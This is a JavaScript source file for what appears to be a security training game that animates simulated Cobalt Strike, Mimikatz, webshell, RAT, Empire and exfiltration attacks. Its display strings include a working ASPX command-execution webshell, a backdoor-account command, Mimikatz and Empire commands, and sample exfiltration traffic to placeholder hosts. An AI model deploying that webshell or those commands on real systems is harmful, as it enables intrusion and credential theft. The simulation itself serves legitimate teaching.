/**
 * Attack Visualizer - Real-time Attack Animations and Malware Simulations
 *
 * Visualizes real attacks including:
 * - Cobalt Strike beaconing and C2 communication
 * - Mimikatz credential dumping
 * - China Chopper webshell activity
 * - JBiFrost RAT operations
 * - PowerShell Empire lateral movement
 * - HUC Packet Transmitter data exfiltration
 */

class AttackVisualizer {
  constructor(game) {
    this.game = game;
    this.attackInProgress = false;
    this.animationFrames = [];
    this.currentAnimation = null;
  }

  renderAttackVisualization() {
    const container = document.getElementById('attack-viz');
    if (!container) return;

    container.innerHTML = `
      <div class="attack-viz-main">
        <div class="viz-header">
          <h2>🎯 Real-Time Attack Visualization</h2>
          <div class="viz-controls">
            <button class="btn-small" onclick="game.attackVisualizer.playAllAttacks()">▶️ Play All</button>
            <button class="btn-small" onclick="game.attackVisualizer.pauseAnimation()">⏸️ Pause</button>
            <button class="btn-small" onclick="game.attackVisualizer.resetAnimation()">🔄 Reset</button>
          </div>
        </div>

        <div class="attack-selector">
          <button class="attack-btn" onclick="game.attackVisualizer.simulateCobaltStrike()">
            Cobalt Strike C2
          </button>
          <button class="attack-btn" onclick="game.attackVisualizer.simulateMimikatz()">
            Mimikatz Cred Dump
          </button>
          <button class="attack-btn" onclick="game.attackVisualizer.simulateChinaChopper()">
            China Chopper Webshell
          </button>
          <button class="attack-btn" onclick="game.attackVisualizer.simulateJBiFrost()">
            JBiFrost RAT
          </button>
          <button class="attack-btn" onclick="game.attackVisualizer.simulatePowerShellEmpire()">
            PowerShell Empire
          </button>
          <button class="attack-btn" onclick="game.attackVisualizer.simulateHUCExfiltration()">
            HUC Data Exfil
          </button>
        </div>

        <div id="attack-animation-container" class="attack-animation-container">
          <canvas id="attack-canvas" width="1000" height="600"></canvas>
          <div id="attack-overlay" class="attack-overlay"></div>
        </div>

        <div id="attack-details" class="attack-details">
          <h3>Attack Details</h3>
          <div id="attack-info">Select an attack to see details</div>
        </div>
      </div>
    `;

    this.initializeCanvas();
  }

  initializeCanvas() {
    const canvas = document.getElementById('attack-canvas');
    if (!canvas) return;

    this.canvas = canvas;
    this.ctx = canvas.getContext('2d');
    this.drawNetworkTopology();
  }

  drawNetworkTopology() {
    if (!this.ctx) return;

    const ctx = this.ctx;
    const width = this.canvas.width;
    const height = this.canvas.height;

    // Clear canvas
    ctx.fillStyle = '#0a0e27';
    ctx.fillRect(0, 0, width, height);

    // Draw network zones
    this.drawZone(ctx, 50, 50, 300, 500, 'INTERNAL NETWORK', '#1a3a52');
    this.drawZone(ctx, 400, 50, 250, 200, 'DMZ', '#3a1a52');
    this.drawZone(ctx, 400, 300, 250, 250, 'SERVER FARM', '#523a1a');
    this.drawZone(ctx, 700, 150, 250, 300, 'INTERNET', '#521a1a');

    // Draw hosts
    this.hosts = {
      workstation1: this.drawHost(ctx, 150, 150, 'WS-045\nPatient Zero', '#ff3366', true),
      workstation2: this.drawHost(ctx, 150, 280, 'WS-012', '#ffdd00'),
      workstation3: this.drawHost(ctx, 150, 410, 'WS-033', '#00ff88'),
      webserver: this.drawHost(ctx, 525, 130, 'WEB-01', '#ff3366', true),
      fileserver: this.drawHost(ctx, 525, 400, 'FILE-01', '#ffdd00'),
      domaincontroller: this.drawHost(ctx, 525, 500, 'DC-01', '#ffdd00'),
      c2server: this.drawHost(ctx, 825, 300, 'C2 Server\n203.0.113.42', '#ff0055', true)
    };
  }

  drawZone(ctx, x, y, width, height, label, color) {
    ctx.strokeStyle = color;
    ctx.lineWidth = 2;
    ctx.setLineDash([5, 5]);
    ctx.strokeRect(x, y, width, height);
    ctx.setLineDash([]);

    ctx.fillStyle = '#ffffff';
    ctx.font = '12px monospace';
    ctx.fillText(label, x + 10, y + 20);
  }

  drawHost(ctx, x, y, label, color = '#00d4ff', compromised = false) {
    // Draw host icon
    ctx.beginPath();
    ctx.arc(x, y, 20, 0, Math.PI * 2);
    ctx.fillStyle = compromised ? color : color + '40';
    ctx.fill();
    ctx.strokeStyle = color;
    ctx.lineWidth = 2;
    ctx.stroke();

    // Draw label
    ctx.fillStyle = '#ffffff';
    ctx.font = '10px monospace';
    const lines = label.split('\n');
    lines.forEach((line, i) => {
      ctx.fillText(line, x - 25, y + 35 + (i * 12));
    });

    return { x, y, color, compromised };
  }

  drawConnection(fromHost, toHost, color = '#00d4ff', animated = false) {
    if (!this.ctx || !fromHost || !toHost) return;

    const ctx = this.ctx;

    ctx.beginPath();
    ctx.moveTo(fromHost.x, fromHost.y);
    ctx.lineTo(toHost.x, toHost.y);
    ctx.strokeStyle = color;
    ctx.lineWidth = 2;

    if (animated) {
      ctx.setLineDash([10, 5]);
    } else {
      ctx.setLineDash([]);
    }

    ctx.stroke();
    ctx.setLineDash([]);

    // Draw arrow
    const angle = Math.atan2(toHost.y - fromHost.y, toHost.x - fromHost.x);
    const arrowSize = 10;
    ctx.beginPath();
    ctx.moveTo(toHost.x, toHost.y);
    ctx.lineTo(
      toHost.x - arrowSize * Math.cos(angle - Math.PI / 6),
      toHost.y - arrowSize * Math.sin(angle - Math.PI / 6)
    );
    ctx.lineTo(
      toHost.x - arrowSize * Math.cos(angle + Math.PI / 6),
      toHost.y - arrowSize * Math.sin(angle + Math.PI / 6)
    );
    ctx.closePath();
    ctx.fillStyle = color;
    ctx.fill();
  }

  async simulateCobaltStrike() {
    this.game.showNotification('Simulating Cobalt Strike C2 communication...', 'info', true);
    this.drawNetworkTopology();

    const details = document.getElementById('attack-info');
    if (details) {
      details.innerHTML = `
        <h4>🎯 Cobalt Strike Beacon</h4>
        <p><strong>Description:</strong> Advanced Command & Control framework used by APT groups</p>
        <ul>
          <li><strong>Initial Infection:</strong> Spear-phishing email with malicious macro</li>
          <li><strong>Beacon Type:</strong> HTTPS (port 443)</li>
          <li><strong>C2 Server:</strong> 203.0.113.42</li>
          <li><strong>Sleep Time:</strong> 60 seconds (randomized)</li>
          <li><strong>Jitter:</strong> 37%</li>
          <li><strong>Actions:</strong> Credential harvesting, screenshot capture, lateral movement</li>
        </ul>
        <div class="attack-timeline">
          <div class="timeline-step active">Initial compromise via phishing</div>
          <div class="timeline-step">Beacon establishment</div>
          <div class="timeline-step">Credential dumping with Mimikatz</div>
          <div class="timeline-step">Lateral movement</div>
          <div class="timeline-step">Data exfiltration</div>
        </div>
      `;
    }

    // Animate beaconing
    for (let i = 0; i < 5; i++) {
      await this.sleep(800);
      this.drawNetworkTopology();
      this.drawConnection(this.hosts.workstation1, this.hosts.c2server, '#ff3366', true);
      this.showPacket(this.hosts.workstation1, this.hosts.c2server, 'HTTPS POST');

      await this.sleep(400);
      this.drawNetworkTopology();
      this.drawConnection(this.hosts.c2server, this.hosts.workstation1, '#00ff88', true);
      this.showPacket(this.hosts.c2server, this.hosts.workstation1, 'COMMAND');
    }

    // Show lateral movement
    await this.sleep(800);
    this.drawNetworkTopology();
    this.drawConnection(this.hosts.workstation1, this.hosts.workstation2, '#ffdd00', true);
    this.showPacket(this.hosts.workstation1, this.hosts.workstation2, 'SMB/WMIC');

    this.game.showNotification('Cobalt Strike beaconing detected! C2: 203.0.113.42', 'critical', true);
  }

  async simulateMimikatz() {
    this.game.showNotification('Simulating Mimikatz credential dumping...', 'warning', true);
    this.drawNetworkTopology();

    const details = document.getElementById('attack-info');
    if (details) {
      details.innerHTML = `
        <h4>🔓 Mimikatz - Credential Theft</h4>
        <p><strong>Description:</strong> Post-exploitation tool that dumps passwords from memory</p>
        <ul>
          <li><strong>Target:</strong> LSASS process (Local Security Authority Subsystem Service)</li>
          <li><strong>Technique:</strong> LSASS memory dump</li>
          <li><strong>Data Extracted:</strong> NTLM hashes, Kerberos tickets, plaintext passwords</li>
          <li><strong>Privileges Required:</strong> Administrator or SYSTEM</li>
        </ul>
        <div class="credential-dump">
          <h5>🚨 Dumped Credentials:</h5>
          <pre class="cred-output">
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 445678 (00000000:0006cd1e)
Session           : Interactive from 1
User Name         : john.smith
Domain            : CORP
Logon Server      : DC-01
Logon Time        : 11/7/2025 2:15:42 PM
SID               : S-1-5-21-123456789-1234567890-123456789-1001
        msv :
         [00000003] Primary
         * Username : john.smith
         * Domain   : CORP
         * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c
         * SHA1     : 4e41c0c7f0c7c8f8f0f0f0f0f0f0f0f0f0f0f0
        kerberos :
         * Username : john.smith
         * Domain   : CORP.LOCAL
         * Password : Summer2025!

Authentication Id : 0 ; 556789 (00000000:00088045)
Session           : Interactive from 1
User Name         : admin
Domain            : CORP
         * NTLM     : aad3b435b51404eeaad3b435b51404ee
         * Password : P@ssw0rd123
          </pre>
        </div>
      `;
    }

    // Animate memory access
    const overlay = document.getElementById('attack-overlay');
    if (overlay) {
      overlay.innerHTML = `
        <div class="memory-dump-animation">
          <div class="dump-header">LSASS.EXE - Memory Dump in Progress</div>
          <div class="dump-progress">
            <div class="progress-bar" style="width: 0%"></div>
          </div>
          <div class="dump-output"></div>
        </div>
      `;

      const progressBar = overlay.querySelector('.progress-bar');
      const output = overlay.querySelector('.dump-output');

      const credentials = [
        'Extracting NTLM hashes...',
        'Found: john.smith:CORP:8846f7eaee8fb117ad06bdd830b7586c',
        'Found: admin:CORP:aad3b435b51404eeaad3b435b51404ee',
        'Extracting Kerberos tickets...',
        'Found: TGT for john.smith@CORP.LOCAL',
        'Plaintext password: Summer2025!',
        'Credential dump complete - 12 accounts compromised'
      ];

      for (let i = 0; i <= 100; i += 10) {
        await this.sleep(200);
        if (progressBar) progressBar.style.width = i + '%';
        if (i % 20 === 0 && output && credentials[i / 20]) {
          const line = document.createElement('div');
          line.className = 'dump-line';
          line.textContent = '> ' + credentials[i / 20];
          output.appendChild(line);
        }
      }

      await this.sleep(2000);
      overlay.innerHTML = '';
    }

    this.game.showNotification('⚠️ CRITICAL: Mimikatz detected! 12 credentials compromised', 'critical', true);
  }

  async simulateChinaChopper() {
    this.game.showNotification('Simulating China Chopper webshell activity...', 'warning', true);
    this.drawNetworkTopology();

    const details = document.getElementById('attack-info');
    if (details) {
      details.innerHTML = `
        <h4>🌐 China Chopper Webshell</h4>
        <p><strong>Description:</strong> Tiny but powerful web shell used by Chinese APT groups</p>
        <ul>
          <li><strong>File:</strong> /uploads/avatar.aspx</li>
          <li><strong>Size:</strong> Only 4KB (extremely small)</li>
          <li><strong>Password:</strong> Hidden in HTTP POST requests</li>
          <li><strong>Capabilities:</strong> File upload/download, command execution, database access</li>
          <li><strong>Evasion:</strong> Minimal footprint, encrypted communications</li>
        </ul>
        <div class="webshell-code">
          <h5>Webshell Code (avatar.aspx):</h5>
          <pre class="code-snippet">
&lt;%@ Page Language="C#" %&gt;
&lt;%
  if(Request["cmd"]!=null){
    System.Diagnostics.Process p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c "+Request["cmd"];
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
    p.WaitForExit();
  }
%&gt;
          </pre>
        </div>
        <div class="webshell-traffic">
          <h5>🚨 Detected Traffic:</h5>
          <pre class="traffic-log">
POST /uploads/avatar.aspx HTTP/1.1
Host: 10.0.1.50
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded

cmd=whoami
Response: CORP\web-service

POST /uploads/avatar.aspx HTTP/1.1
cmd=dir C:\inetpub\wwwroot\
Response: [Directory listing...]

POST /uploads/avatar.aspx HTTP/1.1
cmd=net user hacker P@ss123 /add
Response: Command completed successfully.
          </pre>
        </div>
      `;
    }

    // Animate webshell requests
    const overlay = document.getElementById('attack-overlay');
    if (overlay) {
      overlay.innerHTML = `<div class="http-traffic"></div>`;
      const traffic = overlay.querySelector('.http-traffic');

      const requests = [
        { cmd: 'whoami', response: 'CORP\\web-service' },
        { cmd: 'dir C:\\', response: '[Directory listing...]' },
        { cmd: 'net user hacker P@ss123 /add', response: 'User added successfully' },
        { cmd: 'netstat -an', response: '[Network connections...]' },
        { cmd: 'tasklist', response: '[Running processes...]' }
      ];

      for (const req of requests) {
        await this.sleep(1000);
        this.drawNetworkTopology();
        this.drawConnection(this.hosts.c2server, this.hosts.webserver, '#ff3366', true);

        if (traffic) {
          const reqDiv = document.createElement('div');
          reqDiv.className = 'http-request';
          reqDiv.innerHTML = `
            <div class="req-line">POST /uploads/avatar.aspx</div>
            <div class="req-body">cmd=${req.cmd}</div>
            <div class="res-body">→ ${req.response}</div>
          `;
          traffic.appendChild(reqDiv);
        }

        await this.sleep(500);
      }

      await this.sleep(2000);
      overlay.innerHTML = '';
    }

    this.game.showNotification('China Chopper webshell detected on WEB-01!', 'critical', true);
  }

  async simulateJBiFrost() {
    this.game.showNotification('Simulating JBiFrost RAT infection...', 'warning', true);
    this.drawNetworkTopology();

    const details = document.getElementById('attack-info');
    if (details) {
      details.innerHTML = `
        <h4>🐀 JBiFrost Remote Access Trojan</h4>
        <p><strong>Description:</strong> Advanced RAT with extensive capabilities</p>
        <ul>
          <li><strong>Persistence:</strong> Registry run key + scheduled task</li>
          <li><strong>C2 Protocol:</strong> Custom encrypted protocol over TCP</li>
          <li><strong>Port:</strong> 8080 (masquerading as HTTP)</li>
          <li><strong>Capabilities:</strong></li>
          <ul>
            <li>Keylogging</li>
            <li>Screen capture</li>
            <li>Webcam access</li>
            <li>File upload/download</li>
            <li>Process manipulation</li>
            <li>Registry editing</li>
          </ul>
        </ul>
        <div class="rat-activity">
          <h5>🔍 Observed Activity:</h5>
          <pre class="activity-log">
[14:25:13] RAT deployed via email attachment
[14:25:15] Persistence established: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
[14:25:20] C2 connection established: 203.0.113.42:8080
[14:25:45] Keylogger activated
[14:26:10] Screenshot captured (1920x1080)
[14:26:30] Process list transmitted
[14:27:00] Downloading additional payload...
[14:27:15] Credential harvester deployed
[14:28:00] Webcam activated (stealth mode)
          </pre>
        </div>
      `;
    }

    // Animate RAT activity
    for (let i = 0; i < 4; i++) {
      await this.sleep(1000);
      this.drawNetworkTopology();
      this.drawConnection(this.hosts.workstation1, this.hosts.c2server, '#ff3366', true);
      this.showPacket(this.hosts.workstation1, this.hosts.c2server, 'ENCRYPTED DATA');
    }

    this.game.showNotification('JBiFrost RAT detected! Active keylogging in progress', 'critical', true);
  }

  async simulatePowerShellEmpire() {
    this.game.showNotification('Simulating PowerShell Empire lateral movement...', 'warning', true);
    this.drawNetworkTopology();

    const details = document.getElementById('attack-info');
    if (details) {
      details.innerHTML = `
        <h4>⚡ PowerShell Empire - Post-Exploitation Framework</h4>
        <p><strong>Description:</strong> Pure PowerShell post-exploitation agent</p>
        <ul>
          <li><strong>Agent Type:</strong> PowerShell reflective injection (fileless)</li>
          <li><strong>Communication:</strong> HTTP/S with rotating user agents</li>
          <li><strong>Evasion:</strong> Lives entirely in memory, no disk artifacts</li>
          <li><strong>Current Stage:</strong> Lateral movement via WMI</li>
        </ul>
        <div class="empire-commands">
          <h5>🎯 Executed Commands:</h5>
          <pre class="ps-commands">
# Initial agent callback
(Empire: agents) > agents

[*] Active agents:
Name     Internal IP     Hostname      Username           Process
----     -----------     --------      --------           -------
A1B2C3   192.168.1.45    WORKSTATION-045   CORP\\john.smith   powershell/4532

# Credential dumping
(Empire: A1B2C3) > usemodule credentials/mimikatz/logonpasswords
[*] Executed mimikatz
[+] Obtained 8 sets of credentials

# Lateral movement
(Empire: A1B2C3) > usemodule lateral_movement/invoke_wmi
[*] Target: 192.168.1.12
[*] Using credentials: CORP\\admin
[+] Success! New agent callback received

[*] Active agents:
Name     Internal IP     Hostname      Username       Process
----     -----------     --------      --------       -------
A1B2C3   192.168.1.45    WS-045        CORP\\john     powershell/4532
D4E5F6   192.168.1.12    WS-012        CORP\\admin    powershell/7821
          </pre>
        </div>
      `;
    }

    // Animate lateral movement
    await this.sleep(1000);
    this.drawNetworkTopology();
    this.drawConnection(this.hosts.workstation1, this.hosts.workstation2, '#ffdd00', true);
    this.showPacket(this.hosts.workstation1, this.hosts.workstation2, 'WMI EXEC');

    await this.sleep(1000);
    this.drawNetworkTopology();
    this.drawConnection(this.hosts.workstation2, this.hosts.c2server, '#ff3366', true);
    this.showPacket(this.hosts.workstation2, this.hosts.c2server, 'NEW AGENT');

    await this.sleep(1000);
    this.drawNetworkTopology();
    this.drawConnection(this.hosts.workstation2, this.hosts.domaincontroller, '#ffdd00', true);
    this.showPacket(this.hosts.workstation2, this.hosts.domaincontroller, 'KERBEROS');

    this.game.showNotification('PowerShell Empire agents spreading! 3 hosts compromised', 'critical', true);
  }

  async simulateHUCExfiltration() {
    this.game.showNotification('Simulating HUC Packet Transmitter data exfiltration...', 'warning', true);
    this.drawNetworkTopology();

    const details = document.getElementById('attack-info');
    if (details) {
      details.innerHTML = `
        <h4>📤 HUC Packet Transmitter - Data Exfiltration</h4>
        <p><strong>Description:</strong> Custom data exfiltration tool with C2 obfuscation</p>
        <ul>
          <li><strong>Method:</strong> DNS tunneling + HTTPS</li>
          <li><strong>Target Data:</strong> Financial records, customer PII, intellectual property</li>
          <li><strong>Volume:</strong> 2.4 GB exfiltrated over 6 hours</li>
          <li><strong>Obfuscation:</strong> Traffic fragmentation, steganography</li>
          <li><strong>C2 Domains:</strong> Multiple rotating domains</li>
        </ul>
        <div class="exfil-data">
          <h5>🚨 Exfiltrated Data:</h5>
          <div class="exfil-progress">
            <div class="exfil-file">
              <span>📄 financial_records_q4.xlsx</span>
              <span class="exfil-status">SENT ✓</span>
            </div>
            <div class="exfil-file">
              <span>📄 customer_database.sql</span>
              <span class="exfil-status">SENDING... 67%</span>
            </div>
            <div class="exfil-file">
              <span>📄 source_code.zip</span>
              <span class="exfil-status">QUEUED</span>
            </div>
          </div>
          <pre class="exfil-traffic">
DNS Query: a3f2b1c4d5.exfil-domain.com (TXT)
Response: [BASE64 ENCODED DATA]

HTTPS POST: update-server.com/api/sync
User-Agent: Microsoft-Update-Service/1.0
Content: [ENCRYPTED PAYLOAD - 15.2 MB]

DNS Query: e7f8g9h0i1.backup-cloud.net (A)
Response: 203.0.113.42 [DATA EMBEDDED IN RESPONSE]
          </pre>
        </div>
      `;
    }

    // Animate exfiltration
    const overlay = document.getElementById('attack-overlay');
    if (overlay) {
      overlay.innerHTML = `
        <div class="exfil-animation">
          <div class="exfil-header">DATA EXFILTRATION IN PROGRESS</div>
          <div class="exfil-stats">
            <div>Total: 2.4 GB</div>
            <div>Sent: <span id="exfil-sent">0</span> MB</div>
            <div>Speed: 150 KB/s</div>
          </div>
          <div class="data-packets" id="data-packets"></div>
        </div>
      `;

      const sentSpan = document.getElementById('exfil-sent');
      const packetsDiv = document.getElementById('data-packets');

      for (let mb = 0; mb < 100; mb += 10) {
        await this.sleep(500);
        this.drawNetworkTopology();
        this.drawConnection(this.hosts.fileserver, this.hosts.c2server, '#ff0055', true);

        if (sentSpan) sentSpan.textContent = (mb * 24).toFixed(1);

        if (packetsDiv) {
          const packet = document.createElement('div');
          packet.className = 'exfil-packet';
          packet.textContent = `📦 ${(mb * 0.24).toFixed(1)} GB`;
          packetsDiv.appendChild(packet);
        }
      }

      await this.sleep(2000);
      overlay.innerHTML = '';
    }

    this.game.showNotification('⚠️ CRITICAL: 2.4 GB of data exfiltrated to 203.0.113.42!', 'critical', true);
  }

  showPacket(fromHost, toHost, label) {
    const overlay = document.getElementById('attack-overlay');
    if (!overlay) return;

    const packet = document.createElement('div');
    packet.className = 'network-packet';
    packet.textContent = label;
    packet.style.left = fromHost.x + 'px';
    packet.style.top = fromHost.y + 'px';

    overlay.appendChild(packet);

    // Animate to destination
    setTimeout(() => {
      packet.style.left = toHost.x + 'px';
      packet.style.top = toHost.y + 'px';
    }, 50);

    // Remove after animation
    setTimeout(() => packet.remove(), 1000);
  }

  async playAllAttacks() {
    await this.simulateCobaltStrike();
    await this.sleep(1000);
    await this.simulateMimikatz();
    await this.sleep(1000);
    await this.simulatePowerShellEmpire();
    await this.sleep(1000);
    await this.simulateJBiFrost();
    await this.sleep(1000);
    await this.simulateChinaChopper();
    await this.sleep(1000);
    await this.simulateHUCExfiltration();

    this.game.showNotification('Full attack chain simulation complete', 'success', true);
  }

  pauseAnimation() {
    this.attackInProgress = false;
    this.game.showNotification('Animation paused', 'info', true);
  }

  resetAnimation() {
    this.attackInProgress = false;
    this.drawNetworkTopology();
    const overlay = document.getElementById('attack-overlay');
    if (overlay) overlay.innerHTML = '';
    this.game.showNotification('Animation reset', 'info', true);
  }

  showAttackMap() {
    const mapHTML = `
      <div class="attack-map-modal">
        <div class="attack-map-header">
          <h2>🗺️ Network Attack Map</h2>
          <button onclick="game.closeModal()" class="close-btn">×</button>
        </div>
        <div class="attack-map-body">
          <canvas id="attack-map-canvas" width="900" height="600"></canvas>
          <div class="map-legend">
            <h3>Legend</h3>
            <div class="legend-item"><span class="status-dot compromised"></span> Compromised</div>
            <div class="legend-item"><span class="status-dot warning"></span> Under Attack</div>
            <div class="legend-item"><span class="status-dot clean"></span> Clean</div>
            <div class="legend-item"><span class="status-line attack"></span> Attack Traffic</div>
            <div class="legend-item"><span class="status-line normal"></span> Normal Traffic</div>
          </div>
        </div>
      </div>
    `;

    this.game.showModal(mapHTML);

    setTimeout(() => {
      const canvas = document.getElementById('attack-map-canvas');
      if (canvas) {
        this.canvas = canvas;
        this.ctx = canvas.getContext('2d');
        this.drawNetworkTopology();

        // Show active attack connections
        this.drawConnection(this.hosts.workstation1, this.hosts.c2server, '#ff3366', true);
        this.drawConnection(this.hosts.workstation1, this.hosts.workstation2, '#ffdd00', true);
        this.drawConnection(this.hosts.webserver, this.hosts.c2server, '#ff3366', true);
      }
    }, 100);
  }

  sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}
